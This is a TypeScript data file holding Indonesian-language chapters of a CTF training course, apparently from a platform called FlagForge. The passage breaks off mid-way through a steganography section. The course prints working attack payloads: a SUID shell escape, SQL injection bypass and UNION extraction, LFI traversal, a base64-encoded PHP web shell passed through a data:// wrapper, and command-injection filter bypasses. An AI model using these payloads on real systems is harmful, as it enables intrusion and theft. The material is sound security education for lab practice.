import { CategoryInfo, ModuleChapter } from '../types';

export const CATEGORIES: CategoryInfo[] = [
  {
    id: 'pengantar',
    name: 'Pengantar CTF',
    shortName: 'Intro',
    tag: 'FUNDAMENTAL',
    icon: 'Flag',
    description: 'Konsep dasar Capture The Flag, format Jeopardy vs Attack-Defense, anatomi challenge, dan etika hacker.',
    difficultyTier: 'basic',
    color: '#FF5A1F',
    chapterNumber: 1
  },
  {
    id: 'environment',
    name: 'Persiapan Environment',
    shortName: 'Setup',
    tag: 'TOOLING & LAB',
    icon: 'Terminal',
    description: 'Instalasi Kali Linux, WSL2, Docker, dan kumpulan tools esensial cybersecurity (Burp, Ghidra, Wireshark).',
    difficultyTier: 'basic',
    color: '#3B82F6',
    chapterNumber: 2
  },
  {
    id: 'linux',
    name: 'Dasar Linux & CLI',
    shortName: 'Linux',
    tag: 'OPERATING SYSTEM',
    icon: 'Terminal',
    description: 'Navigasi terminal, file permissions (SUID), inspeksi binary, text processing (grep, awk, sed), dan privilege escalation.',
    difficultyTier: 'basic',
    color: '#4ADE80',
    chapterNumber: 3
  },
  {
    id: 'networking',
    name: 'Jaringan Komputer',
    shortName: 'Network',
    tag: 'PROTOCOLS & PCAP',
    icon: 'Wifi',
    description: 'TCP/IP 3-way handshake, OSI Layer, port scanning nmap, netcat listener, dan analisis paket Wireshark.',
    difficultyTier: 'basic',
    color: '#38BDF8',
    chapterNumber: 4
  },
  {
    id: 'crypto',
    name: 'Cryptography',
    shortName: 'Crypto',
    tag: 'CIPHERS & KEYS',
    icon: 'Lock',
    description: 'Encoding (Base64, Hex), Classic Ciphers (Caesar, Vigenère, XOR), AES CBC bit-flipping, dan eksploitasi RSA.',
    difficultyTier: 'menengah',
    color: '#A855F7',
    chapterNumber: 5
  },
  {
    id: 'web',
    name: 'Web Exploitation',
    shortName: 'Web',
    tag: 'OWASP TOP 10',
    icon: 'Globe',
    description: 'SQL Injection, XSS, IDOR, LFI/RFI dengan PHP Wrappers, Command Injection, SSRF, dan kelemahan autentikasi JWT.',
    difficultyTier: 'menengah',
    color: '#F43F5E',
    chapterNumber: 6
  },
  {
    id: 'forensics',
    name: 'Digital Forensics',
    shortName: 'Forensics',
    tag: 'ARTIFACTS & MEMORY',
    icon: 'Search',
    description: 'Magic bytes header repair, metadata carving (exiftool), file extraction binwalk, dan memory analysis Volatility.',
    difficultyTier: 'menengah',
    color: '#F59E0B',
    chapterNumber: 7
  },
  {
    id: 'stego',
    name: 'Steganography',
    shortName: 'Stego',
    tag: 'HIDDEN PAYLOADS',
    icon: 'EyeOff',
    description: 'Teknik LSB image encoding, zsteg, steghide brute-force, dan visualisasi audio spectrogram.',
    difficultyTier: 'basic',
    color: '#EC4899',
    chapterNumber: 8
  },
  {
    id: 'reverse',
    name: 'Reverse Engineering',
    shortName: 'Reverse',
    tag: 'DECOMPILATION',
    icon: 'Cpu',
    description: 'Arsitektur register x86/x64, decompilation Ghidra/IDA, binary patching, dan dynamic debugging dengan GDB-pwndbg.',
    difficultyTier: 'advance',
    color: '#06B6D4',
    chapterNumber: 9
  },
  {
    id: 'pwn',
    name: 'Binary Exploitation (Pwn)',
    shortName: 'Pwn',
    tag: 'MEMORY CORRUPTION',
    icon: 'Flame',
    description: 'Memory stack layout, Buffer Overflow klasik, EIP control, bypass mitigasi (Canary, NX, ASLR), dan pwntools.',
    difficultyTier: 'advance',
    color: '#EF4444',
    chapterNumber: 10
  },
  {
    id: 'osint',
    name: 'OSINT Intelligence',
    shortName: 'OSINT',
    tag: 'RECONNAISSANCE',
    icon: 'Compass',
    description: 'Advanced Google Dorking, WHOIS & DNS footprinting, SOCMINT tracking, geolokasi citra satelit, dan metadata docs.',
    difficultyTier: 'basic',
    color: '#10B981',
    chapterNumber: 11
  },
  {
    id: 'scripting',
    name: 'Scripting Python',
    shortName: 'Scripting',
    tag: 'AUTOMATION',
    icon: 'Code',
    description: 'Automasi eksploitasi web dengan library requests, koneksi remote socket pwntools, dan algoritma decoding cepat.',
    difficultyTier: 'menengah',
    color: '#8B5CF6',
    chapterNumber: 12
  },
  {
    id: 'strategi',
    name: 'Strategi Lomba CTF',
    shortName: 'Strategy',
    tag: 'COMPETITION',
    icon: 'Award',
    description: 'Triage soal berbobot tinggi, teknik time-boxing 30 menit, kolaborasi tim, dan template write-up terstandar.',
    difficultyTier: 'basic',
    color: '#F97316',
    chapterNumber: 13
  },
  {
    id: 'resources',
    name: 'Sumber Belajar & Roadmap',
    shortName: 'Roadmap',
    tag: 'CAREER & LABS',
    icon: 'BookOpen',
    description: 'Platform latihan lanjutan (PicoCTF, HTB, TryHackMe, PortSwigger), sertifikasi industri, dan portofolio siber.',
    difficultyTier: 'basic',
    color: '#14B8A6',
    chapterNumber: 14
  }
];

export const MODULE_CHAPTERS: ModuleChapter[] = [
  // ==========================================
  // BAB 1: PENGANTAR CTF & MINDSET
  // ==========================================
  {
    id: 'pengantar',
    chapterNumber: 1,
    title: 'Pengantar Capture The Flag & Mindset Hacker',
    summary: 'Fondasi esensial mengenai dunia kompetisi Capture The Flag (CTF), anatomi tantangan keamanan siber, format kompetisi internasional, etika legalitas, dan metodologi berpikir analitis.',
    readingTimeMinutes: 10,
    practiceChallengeIds: ['lin_01', 'net_01'],
    sections: [
      {
        id: '1.1',
        title: '1.1 Apa Itu Capture The Flag (CTF)?',
        content: `**Capture The Flag (CTF)** adalah kompetisi edukasi keamanan siber (*cybersecurity*) di mana peserta ditantang untuk menemukan kerentanan (*vulnerability*), mengeksploitasi sistem target, atau memecahkan teka-teki logika untuk mendapatkan string rahasia unik yang disebut **Flag**.

Format flag umumnya distandarisasi dengan tanda pengenal platform atau penyelenggara:

\`\`\`text
flag{contoh_flag_rahasia_anda}
FlagForge{h4ck3r_m1nds3t_4ct1v4t3d}
CTF{b4s1c_t0_4dv4nc3_m4st3ry}
\`\`\`

Flag ini berfungsi sebagai bukti kriptografis bahwa Anda telah berhasil mengeksekusi tahapan analisis atau eksploitasi dengan benar. FlagForge menyediakan lingkungan simulasi aman (*sandbox*) sehingga Anda dapat berlatih secara legal dan etis tanpa risiko merusak sistem publik.`
      },
      {
        id: '1.2',
        title: '1.2 Format Kompetisi CTF Global',
        content: `Kompetisi CTF di dunia umumnya diselenggarakan dalam 3 format utama:

| Format Kompetisi | Mekanisme & Karakteristik | Target Peserta |
|---|---|---|
| **Jeopardy Style** | Kumpulan soal dikelompokkan berdasarkan kategori (Web, Crypto, Pwn, Forensics). Setiap soal memiliki bobot poin tertentu. Peserta bebas memilih soal mana yang ingin dikerjakan terlebih dahulu. | Pemula hingga Mahir (Sangat Populer) |
| **Attack-Defense (A/D)** | Setiap tim diberikan satu atau beberapa server (*Vulnerable Image*) yang menjalankan layanan rentan. Tim harus mempertahankan server sendiri (Patching) sekaligus menyerang server lawan (Exploitation) untuk mencuri flag secara periodik (*tick*). | Mahir / Tim Berpengalaman |
| **King of the Hill (KotH)** | Peserta memperebutkan kendali atas satu mesin terpusat. Poin dihitung berdasarkan durasi waktu peserta berhasil mempertahankan hak akses *root* (*uptime control*). | Menengah hingga Advance |
| **Mixed Mode** | Menggabungkan sesi Jeopardy di babak kualifikasi dan Attack-Defense di babak final. | Kejuaraan Nasional & Dunia (DEF CON, Cyber Jawara) |`
      },
      {
        id: '1.3',
        title: '1.3 Mindset & Metodologi Problem Solving',
        content: `Banyak pemula merasa buntu saat menghadapi tantangan CTF. Kunci utama keberhasilan di CTF bukanlah menghafal *exploit*, melainkan menerapkan **metodologi investigasi terstruktur**:

1. **Reconnaissance & Triage (Pengumpulan Informasi)**:
   - Identifikasi tipe file, port yang terbuka, arsitektur binary, atau teknologi web yang digunakan.
   - Baca deskripsi soal dan judul secara teliti — pembuat soal sering kali menyisipkan petunjuk tersembunyi (*pun* atau nama algoritma).
2. **Formulasi Hipotesis**:
   - Tentukan kemungkinan celah (misal: apakah ini enkripsi XOR, SQL Injection, atau buffer overflow?).
3. **Eksperimentasi & Verifikasi Input**:
   - Uji batas (*boundary testing*), amati respon error sistem, atau periksa metadata berkas.
4. **Automasi Pemecahan**:
   - Jika proses membutuhkan iterasi ribuan kali (seperti decoding bertingkat atau brute-force pin), buat skrip Python sederhana.
5. **Dokumentasi & Write-Up**:
   - Catat setiap langkah yang berhasil dan gagal. Menulis *write-up* adalah cara tercepat meningkatkan retensi belajar.`
      },
      {
        id: '1.4',
        title: '1.4 Etika Hacker & Prinsip Legalitas (Hacking Etis)',
        content: `> **PRINSIP DASAR CYBERSECURITY:**
> Pengetahuan eksploitasi keamanan siber adalah pedang bermata dua. FlagForge mewajibkan seluruh pengguna mematuhi kode etik profesional (*White Hat Ethics*).

- **Otorisasi Penuh**: Hanya serang sistem, domain, atau laboratorium yang secara eksplisit memberi izin uji penetrasi (*scope of engagement*).
- **Responsible Disclosure**: Jika Anda menemukan kerentanan pada sistem nyata, laporkan secara privat ke pemilik sistem (*vendor*) melalui program Bug Bounty atau kontak resmi, bukan menyebarkannya ke publik.
- **Integritas Belajar**: Hindari berbagi flag secara cuma-cuma (*flag sharing*) saat kompetisi berlangsung agar kemampuan analisis Anda berkembang nyata.`
      }
    ]
  },

  // ==========================================
  // BAB 2: PERSIAPAN ENVIRONMENT & TOOLING
  // ==========================================
  {
    id: 'environment',
    chapterNumber: 2,
    title: 'Persiapan Environment & Laboratorium CTF',
    summary: 'Panduan komprehensif penyiapan sistem operasi laboratorium (Kali Linux, WSL2, Docker) dan instalasi perkakas keamanan siber standar industri.',
    readingTimeMinutes: 12,
    practiceChallengeIds: ['lin_01'],
    sections: [
      {
        id: '2.1',
        title: '2.1 Memilih Sistem Operasi Laboratorium',
        content: `Mayoritas *tools* CTF dan keamanan siber dirancang secara natif untuk lingkungan UNIX/Linux. Terdapat tiga pendekatan utama untuk menyiapkan *environment*:

- **Dedicated Security Distro (Kali Linux / Parrot Security OS)**:
  - *Kali Linux*: Distro paling populer dengan ribuan paket keamanan bawaan (*pre-installed*).
  - *Parrot OS*: Distro alternatif yang lebih hemat konsumsi RAM, sangat cocok untuk laptop berspesifikasi menengah.
- **Windows Subsystem for Linux 2 (WSL2)**:
  - Memungkinkan Anda menjalankan kernel Linux Ubuntu/Kali langsung di dalam Windows tanpa overhead performa VM penuh.
- **Docker Containers**:
  - Solusi isolasi ringan untuk menjalankan tool spesifik atau service yang membutuhkan versi pustaka (*library*) tertentu.`
      },
      {
        id: '2.2',
        title: '2.2 Matriks Toolkit Esensial Berdasarkan Kategori',
        content: `Berikut daftar perkakas (*software & CLI tools*) yang wajib terpasang di workstation Anda:

| Kategori | Tool Utama | Fungsi & Kegunaan |
|---|---|---|
| **Web Exploitation** | **Burp Suite Community** | Intercept proxy HTTP/HTTPS, Repeater, Intruder, Decoder |
| | **OWASP ZAP** | Alternatif open-source untuk automated web scanning |
| | **Sqlmap** | Automated SQL Injection and database takeover tool |
| **Network & Traffic** | **Wireshark** | GUI Network protocol analyzer untuk file capture \`.pcap\` |
| | **Tshark & Tcpdump** | CLI packet analyzer untuk pemrosesan trafik cepat |
| | **Nmap** | Network exploration and port vulnerability scanner |
| **Cryptography** | **CyberChef** | "Swiss Army Knife" browser untuk encoding, hashing, & cipher |
| | **RsaCtfTool** | Otomatisasi serangan matematika pada kunci publik RSA |
| | **Hashcat / John The Ripper** | GPU/CPU password and hash cracker berkecapatan tinggi |
| **Reverse Engineering** | **Ghidra** | Software Reverse Engineering (SRE) suite kelas NSA dengan decompiler C |
| | **IDA Free** | Disassembler grafis standar industri untuk analisis alur kendali |
| | **Cutter (Rizin GUI)** | Disassembler open-source modern dan responsif |
| **Binary Exploitation** | **GDB + Pwndbg / GEF** | Debugger GNU dengan ekstensi visual memori stack/heap |
| | **Pwntools** | Framework Python untuk automasi remote exploit & socket IO |
| | **Checksec** | Inspeksi proteksi biner (Canary, NX, PIE, RELRO) |
| **Digital Forensics** | **Binwalk & Foremost** | File carving untuk mengekstraksi arsip tersembunyi |
| | **ExifTool** | Inspeksi dan modifikasi metadata EXIF dokumen/citra |
| | **Volatility 3** | Framework analisis memori RAM (*memory dump*) |
| **Steganography** | **Stegsolve & Zsteg** | Ekstraksi LSB bit plane citra PNG/BMP |
| | **Steghide** | Penyembunyian dan ekstraksi data berbasis passphrase |
| | **Sonic Visualiser** | Analisis spectrogram audio untuk pesan tersembunyi |`
      },
      {
        id: '2.3',
        title: '2.3 Script Setup Instan (Debian / Ubuntu / Kali)',
        content: `Jalankan skrip shell berikut di terminal Linux Anda untuk menginstal seluruh dependensi esensial CTF sekaligus:

\`\`\`bash
#!/bin/bash
# FlagForge Automated Lab Setup
echo "[+] Mengupdate repositori sistem..."
sudo apt update && sudo apt upgrade -y

echo "[+] Menginstal perkakas analisis & jaringan dasar..."
sudo apt install -y build-essential git curl wget netcat-openbsd \
    file binwalk exiftool steghide p7zip-full xxd nmap \
    python3 python3-pip python3-dev libssl-dev libffi-dev gdb

echo "[+] Menginstal Python Security Frameworks..."
pip3 install --upgrade pip
pip3 install pwntools requests pycryptodome sympy z3-solver \
    ropper capstone unicorn scapy

echo "[+] Menginstal GDB-Pwndbg..."
git clone https://github.com/pwndbg/pwndbg ~/pwndbg
cd ~/pwndbg && ./setup.sh

echo "[✓] Lingkungan FlagForge Lab siap digunakan!"
\`\`\``
      }
    ]
  },

  // ==========================================
  // BAB 3: DASAR LINUX & COMMAND LINE
  // ==========================================
  {
    id: 'linux',
    chapterNumber: 3,
    title: 'Dasar Linux, Command Line & Privilege Escalation',
    summary: 'Eksplorasi mendalam mengenai hierarki sistem berkas UNIX, permission matrix (SUID/SGID), pipeline filter data (grep, awk, sed), dan dasar eskalasi hak akses (Privilege Escalation).',
    readingTimeMinutes: 15,
    practiceChallengeIds: ['lin_01', 'lin_02'],
    sections: [
      {
        id: '3.1',
        title: '3.1 Struktur Hierarki Sistem Berkas UNIX',
        content: `Dalam sistem operasi Linux, segala sesuatu direpresentasikan sebagai berkas (*"everything is a file"*). Memahami letak direktori kritis adalah kunci investigasi:

- \`/bin\` & \`/usr/bin\`: Berisi biner aplikasi standar sistem (\`ls\`, \`cat\`, \`grep\`, \`python\`).
- \`/etc\`: Berisi konfigurasi global sistem (\`/etc/passwd\`, \`/etc/shadow\`, \`/etc/sudoers\`).
- \`/var/log\`: Rekaman log aktivitas sistem dan layanan web (\`auth.log\`, \`nginx/access.log\`).
- \`/tmp\` & \`/dev/shm\`: Direktori sementara yang biasanya memiliki permission *World-Writable* — lokasi favorit penyerang untuk mengunggah skrip exploit.
- \`/proc\`: Filesystem virtual di memori yang memuat status kernel dan proses aktif (\`/proc/<PID>/cmdline\`, \`/proc/<PID>/environ\`).`
      },
      {
        id: '3.2',
        title: '3.2 Matriks Permission & Special Bits (SUID / SGID)',
        content: `Izin akses file Linux terbagi menjadi tiga entitas: **User (u)**, **Group (g)**, dan **Others (o)**.

\`\`\`text
- r w x  r - x  r - -    1  cadet  hackers  4096  flag.txt
  └──┬──┘  └──┬──┘  └──┬──┘
     │        │        └─ Others (Hanya Read: 4)
     │        └────────── Group (Read + Execute: 4 + 1 = 5)
     └─────────────────── User Owner (Read + Write + Execute: 4 + 2 + 1 = 7)
\`\`\`

### Nilai Khusus: SUID (Set User ID)
Jika bit **SUID** (\`rwsr-xr-x\`, nilai oktal 4000) aktif pada sebuah file executable, file tersebut akan berjalan dengan hak akses pemilik file (biasanya \`root\`), bukan pengguna yang menjalankannya!

Cara menemukan file biner ber-SUID di seluruh sistem:

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`

> 💡 **Trik CTF - GTFOBins**: Jika biner seperti \`find\`, \`vim\`, atau \`base64\` memiliki bit SUID aktif, Anda dapat menggunakannya untuk membaca flag root secara instan:
> \`\`\`bash
> /usr/bin/find . -exec /bin/sh -p \\; -quit
> \`\`\``
      },
      {
        id: '3.3',
        title: '3.3 Pipeline & Text Processing Tingkat Lanjut',
        content: `Dalam CTF, Anda sering diminta mencari pola flag di antara ribuan baris data acak. Kuasai kombinasi pipa (*pipeline*) berikut:

\`\`\`bash
# 1. Pencarian recursive pola flag di seluruh direktori
grep -rnIE "flag{[a-zA-Z0-9_]+}" /var/www/ 2>/dev/null

# 2. Ekstraksi string terbaca dari file binary berekstensi rusak
strings mystery.bin | grep -i "flag{"

# 3. Parsing kolom tertentu dengan AWK dan CUT
cat /etc/passwd | cut -d: -f1,7 | grep "/bin/bash"

# 4. Pengurutan, penghapusan duplikasi, dan pencarian frekuensi
cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head -n 10

# 5. Konversi Hexdump dan Base64 secara instan
echo "666c61677b6c696e75785f676f647d" | xxd -r -p
echo "ZmxhZ3tzM2NyM3RfcDRzc30=" | base64 -d
\`\`\``
      }
    ]
  },

  // ==========================================
  // BAB 4: JARINGAN KOMPUTER & ANALISIS TRAFIK
  // ==========================================
  {
    id: 'networking',
    chapterNumber: 4,
    title: 'Dasar Jaringan Komputer & Analisis Trafik PCAP',
    summary: 'Pemahaman protokol komunikasi data (OSI & TCP/IP), mekanisme TCP 3-Way Handshake, teknik inspeksi port Nmap, koneksi socket Netcat, dan pembedahan paket Wireshark.',
    readingTimeMinutes: 14,
    practiceChallengeIds: ['net_01', 'net_02'],
    sections: [
      {
        id: '4.1',
        title: '4.1 Model Protokol TCP/IP & Anatomi 3-Way Handshake',
        content: `Jaringan komputer modern bertumpu pada protokol **Transmission Control Protocol (TCP)** yang menjamin pengiriman data handal dan berurutan.

Sebelum pertukaran data terjadi, klien dan server melakukan negosiasi 3 langkah:

\`\`\`text
  KLIEN (Client)                           SERVER (Target)
        │                                         │
        │─── [1] SYN (Seq = X) ──────────────────>│ (Permintaan koneksi)
        │                                         │
        │<── [2] SYN-ACK (Seq=Y, Ack=X+1) ────────│ (Konfirmasi penerimaan)
        │                                         │
        │─── [3] ACK (Seq = X+1, Ack=Y+1) ───────>│ (Koneksi Terbentuk: ESTABLISHED)
        │                                         │
        │========= Pertukaran Data (HTTP / Flag) =========│
\`\`\`

### TCP Flags Penting dalam Investigasi:
- **SYN**: Mengawali inisialisasi koneksi.
- **ACK**: Mengonfirmasi penerimaan paket sebelumnya.
- **PSH**: Meminta buffer segera diteruskan ke aplikasi (sering memuat data payload).
- **RST**: Memutus koneksi secara paksa (indikasi port tertutup atau diblokir firewall).
- **FIN**: Menutup koneksi secara normal.`
      },
      {
        id: '4.2',
        title: '4.2 Port Scanning & Eksplorasi Target dengan Nmap',
        content: `Nmap adalah alat standar industri untuk melakukan *network mapping* dan *port discovery*:

\`\`\`bash
# 1. Stealth SYN Scan cepat ke semua port dengan deteksi versi layanan
nmap -sS -sV -p- -T4 --min-rate 1000 10.10.10.100

# 2. Menjalankan default security scripts untuk mencari celah umum
nmap -sC -sV -p 80,443,8080 target.flagforge.io

# 3. Scanning port UDP kritis (DNS, SNMP, TFTP)
nmap -sU -p 53,161,69 target.flagforge.io
\`\`\``
      },
      {
        id: '4.3',
        title: '4.3 Analisis File Capture (.PCAP) dengan Wireshark',
        content: `Tantangan CTF kategori *Networking* sering kali memberikan berkas rekaman paket (\`.pcap\` atau \`.pcapng\`). Gunakan filter tampilan (*Display Filter*) berikut:

\`\`\`text
# Mencari kredensial atau formulir login via HTTP POST
http.request.method == "POST" || http.request.method == "GET"

# Memfilter transmisi data pada port tertentu
tcp.port == 1337 || udp.port == 53

# Mencari string spesifik "flag{" dalam payload TCP
tcp contains "flag{" || frame contains "flag{"

# Menemukan handshake DNS query yang mencurigakan (DNS Exfiltration)
dns.flags.response == 0
\`\`\`

> 💡 **Fitur Wireshark Wajib**:
> - Klik kanan paket $\\rightarrow$ **Follow $\\rightarrow$ TCP Stream**: Merekonstruksi seluruh percakapan teks antara klien dan server menjadi satu transkrip utuh.
> - Menu **File $\\rightarrow$ Export Objects $\\rightarrow$ HTTP**: Menyimpan seluruh berkas gambar, script, atau file zip yang ditransfer melalui jaringan.`
      }
    ]
  },

  // ==========================================
  // BAB 5: CRYPTOGRAPHY
  // ==========================================
  {
    id: 'crypto',
    chapterNumber: 5,
    title: 'Cryptography: Dari Cipher Klasik ke Enkripsi Modern',
    summary: 'Perbedaan mendasar Encoding vs Hashing vs Encryption, matematika cipher klasik (Caesar, Vigenère, XOR), mode enkripsi blok AES, dan peretasan kunci asimetris RSA.',
    readingTimeMinutes: 16,
    practiceChallengeIds: ['cry_01', 'cry_02'],
    sections: [
      {
        id: '5.1',
        title: '5.1 Taksonomi: Encoding vs Hashing vs Enkripsi',
        content: `Salah satu kesalahan paling umum pemula adalah menyamakan Base64 sebagai enkripsi. Pahami perbedaannya:

| Jenis | Memiliki Kunci Rahasia? | Dapat Dibalikkan (*Reversible*)? | Contoh |
|---|---|---|---|
| **Encoding** | ❌ Tidak |  Ya (Publik) | Base64, Hexadecimal, URL-Encode, Binary |
| **Hashing** | ❌ Tidak | ❌ Tidak (Satu Arah) | MD5, SHA-1, SHA-256, Bcrypt |
| **Symmetric Encryption** |  Ya (1 Kunci Bersama) |  Ya (dengan kunci yang sama) | AES-128, DES, ChaCha20, XOR |
| **Asymmetric Encryption**|  Ya (Pasangan Publik/Privat)|  Ya (Enkripsi dg Publik, Dekripsi dg Privat)| RSA, ECC, ElGamal |`
      },
      {
        id: '5.2',
        title: '5.2 Kekuatan dan Kelemahan Operasi XOR',
        content: `Operasi **Bitwise XOR (\`^\` atau \`\\oplus\`)** adalah pilar utama kriptografi modern karena memiliki sifat aljabar yang elegan:

$$\\text{Ciphertext} = \\text{Plaintext} \\oplus \\text{Key}$$
$$\\text{Plaintext} = \\text{Ciphertext} \\oplus \\text{Key}$$

### Sifat Penting XOR:
1. $A \\oplus 0 = A$
2. $A \\oplus A = 0$
3. Komutatif & Asosiatif: $(A \\oplus B) \\oplus C = A \\oplus (B \\oplus C)$

> ⚠️ **Kerentanan Known-Plaintext Attack (KPA)**:
> Jika Anda mengetahui sebagian plaintext awal (misal awalan \`flag{\`), Anda dapat merekonstruksi kunci rahasia secara instan:
> $$\\text{Key} = \\text{Ciphertext} \\oplus \\text{Plaintext}$$`
      },
      {
        id: '5.3',
        title: '5.3 Kriptografi Modern: Serangan Asimetris RSA',
        content: `Keamanan algoritma **RSA** bergantung pada sulitnya memfaktorkan bilangan bulat besar $n$ menjadi dua bilangan prima rahasia $p$ dan $q$.

### Parameter RSA:
- $n = p \\times q$ (Modulus publik)
- $\\phi(n) = (p-1) \\times (q-1)$ (Euler's Totient)
- $e$ (Eksponen publik, biasanya bernilai $65537$ atau $3$)
- $d \\equiv e^{-1} \\pmod{\\phi(n)}$ (Kunci privat rahasia)

### Skenario Serangan CTF Umum pada RSA:
1. **$n$ Berukuran Kecil atau Dikenal**:
   - Jika $n < 2^{1024}$, cari faktor $p$ dan $q$ melalui database [FactorDB](http://factordb.com).
2. **Small Public Exponent ($e = 3$)**:
   - Jika pesan $m$ kecil dan tidak menggunakan *padding* ($m^e < n$), maka ciphertext $c = m^3$. Plaintext dapat didekripsi cukup dengan menghitung akar kubik biasa: $m = \\sqrt[3]{c}$.
3. **Wiener's Attack**:
   - Terjadi jika pembuat soal menggunakan nilai kunci privat $d$ yang terlalu kecil ($d < \\frac{1}{3} n^{1/4}$).`
      }
    ]
  },

  // ==========================================
  // BAB 6: WEB EXPLOITATION
  // ==========================================
  {
    id: 'web',
    chapterNumber: 6,
    title: 'Web Exploitation: OWASP Top 10 & Vulnerabilities',
    summary: 'Bedah mendalam arsitektur web modern, eksploitasi SQL Injection (UNION & Blind), Cross-Site Scripting (XSS), Local File Inclusion (LFI) dengan PHP Wrappers, dan Command Injection.',
    readingTimeMinutes: 18,
    practiceChallengeIds: ['web_01', 'web_02'],
    sections: [
      {
        id: '6.1',
        title: '6.1 SQL Injection (SQLi) & UNION Exploitation',
        content: `SQL Injection terjadi ketika input pengguna digabungkan langsung ke dalam query database SQL tanpa sanitasi atau *parameterized queries*.

### 1. Authentication Bypass Sederhana:
\`\`\`sql
-- Input: admin' OR '1'='1' -- -
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- -' AND password = '...'
\`\`\`

### 2. UNION-Based Data Extraction:
Langkah demi langkah mengekstrak data dari tabel lain:
\`\`\`sql
-- Langkah 1: Tentukan jumlah kolom yang diekspektasikan query
' UNION SELECT 1, 2, 3 -- -

-- Langkah 2: Ekstrak informasi database dan versi
' UNION SELECT 1, version(), database() -- -

-- Langkah 3: Ekstrak nama seluruh tabel dari information_schema
' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database() -- -

-- Langkah 4: Ekstrak kolom flag
' UNION SELECT 1, flag_value, 3 FROM secret_flags -- -
\`\`\``
      },
      {
        id: '6.2',
        title: '6.2 Local File Inclusion (LFI) & PHP Filter Wrappers',
        content: `Celah LFI muncul saat aplikasi web menyertakan (*include*) berkas berdasarkan input parameter URL:

\`\`\`php
// Kode Rentan:
$page = $_GET['page'];
include($page . ".php");
\`\`\`

### Eksploitasi LFI Tingkat Lanjut:
- **Directory Traversal**: \`?page=../../../../etc/passwd\`
- **PHP Base64 Filter Wrapper**: Membaca source code file PHP tanpa dieksekusi oleh server:
  \`\`\`text
  ?page=php://filter/convert.base64-encode/resource=flag
  \`\`\`
- **PHP Input / Data Wrapper (Remote Code Execution)**:
  \`\`\`text
  ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
  \`\`\``
      },
      {
        id: '6.3',
        title: '6.3 OS Command Injection & Filter Bypass',
        content: `Terjadi saat backend web memanggil fungsi sistem (\`system()\`, \`exec()\`, \`shell_exec()\`, \`child_process\`) dengan input tanpa sanitasi.

\`\`\`text
# Payload Umum Menggunakan Karakter Separator (;, &&, |, backticks, $())
127.0.0.1; cat /flag.txt
127.0.0.1 && id
\`\`\`

### Trik Bypass Blacklist Karakter:
- **Bypass Spasi**: Menggunakan \`\\$IFS\` atau \`\\$IFS\\$9\` atau input redirection \`<flag.txt\`.
- **Bypass Kata Terlarang (misal kata 'cat' diblokir)**:
  - Menggunakan wildcard: \`/bin/c?t /fl*g\`
  - Menggunakan concatenator: \`c'a't /flag.txt\` atau \`c""at /flag.txt\`
  - Menggunakan Base64 execution: \`echo Y2F0IC9mbGFnLnR4dAo= | base64 -d | sh\`
`
      }
    ]
  },

  // ==========================================
  // BAB 7: DIGITAL FORENSICS
  // ==========================================
  {
    id: 'forensics',
    chapterNumber: 7,
    title: 'Digital Forensics, Metadata & Memory Carving',
    summary: 'Teknik identifikasi Magic Bytes berkas, analisis integritas struktur header file gambar/zip, ekstraksi metadata dokumen, dan investigasi artefak memori RAM menggunakan Volatility.',
    readingTimeMinutes: 14,
    practiceChallengeIds: ['for_01', 'for_02'],
    sections: [
      {
        id: '7.1',
        title: '7.1 File Signatures (Magic Bytes) & Hex Repair',
        content: `Sistem operasi tidak hanya mengandalkan ekstensi berkas, melainkan membaca byte penanda di awal file (*Magic Bytes*). Pembuat soal CTF sering kali merusak byte ini agar file tidak bisa dibuka:

| Format Berkas | Magic Bytes (Hexadecimal) | ASCII Header |
|---|---|---|
| **PNG** | \`89 50 4E 47 0D 0A 1A 0A\` | \`.PNG....\` |
| **JPEG / JPG** | \`FF D8 FF E0\` atau \`FF D8 FF E1\` | \`....\` |
| **GIF89a** | \`47 49 46 38 39 61\` | \`GIF89a\` |
| **PDF** | \`25 50 44 46\` | \`%PDF\` |
| **ZIP / DOCX / APK**| \`50 4B 03 04\` | \`PK..\` |
| **ELF (Linux Executable)**| \`7F 45 4C 46\` | \`.ELF\` |

Jika gambar PNG Anda corupt, buka menggunakan Hex Editor (\`hexedit\` atau \`010 Editor\`) dan pulihkan 8 byte pertamanya dengan signature di atas.`
      },
      {
        id: '7.2',
        title: '7.2 File Carving & Ekstraksi Konten Tersembunyi',
        content: `Gunakan toolkit berikut untuk mengekstraksi file yang disisipkan atau digabungkan ke dalam berkas lain:

\`\`\`bash
# 1. Memeriksa keberadaan file arsip atau gambar tersembunyi
binwalk mystery_file.png

# 2. Mengekstrak seluruh komponen secara otomatis
binwalk -e --extract --dd=".*" mystery_file.png

# 3. Menggunakan foremost sebagai alternatif carver
foremost -i mystery_file.png -o output_directory/
\`\`\``
      },
      {
        id: '7.3',
        title: '7.3 Analisis Memory Dump dengan Volatility 3',
        content: `Saat sistem disusupi, bukti eksekusi malware dan flag sering kali tertinggal di RAM (*memory dump* \`.raw\` atau \`.dmp\`):

\`\`\`bash
# 1. Melihat daftar proses aktif saat memori direkam
python3 vol.py -f memory.raw windows.pslist
python3 vol.py -f memory.raw windows.pstree

# 2. Melihat perintah yang diketik di Command Prompt
python3 vol.py -f memory.raw windows.cmdline

# 3. Mencari dan mengekstrak file flag dari memori
python3 vol.py -f memory.raw windows.filescan | grep -i "flag"
python3 vol.py -f memory.raw windows.dumpfiles --virtaddr 0x0000deadbeef
\`\`\``
      }
    ]
  },

  // ==========================================
  // BAB 8: STEGANOGRAPHY
  // ==========================================
  {
    id: 'stego',
    chapterNumber: 8,
    title: 'Steganography: Seni Menyembunyikan Pesan Rahasia',
    summary: 'Prinsip Least Significant Bit (LSB) pada citra digital, ekstraksi payload ber-passphrase dengan Steghide, serta decoding audio spectrogram.',
    readingTimeMinutes: 12,
    practiceChallengeIds: ['stg_01', 'stg_02'],
    sections: [
      {
        id: '8.1',
        title: '8.1 Least Significant Bit (LSB) Steganography',
        content: `Format citra RGB menyimpan warna setiap pixel dalam 8-bit merah (R), 8-bit hijau (G), dan 8-bit biru (B). Mengubah bit paling ujung (*Least Significant Bit*) tidak akan terlihat secara visual oleh mata manusia.

Contoh penyisipan bit karakter 'A' (ASCII 65 = \`01000001\`):
\`\`\`text
Nilai Pixel Asli (8 bytes):
11010010  10110111  01101000  11010011  10101110  01100001  11101000  10100110

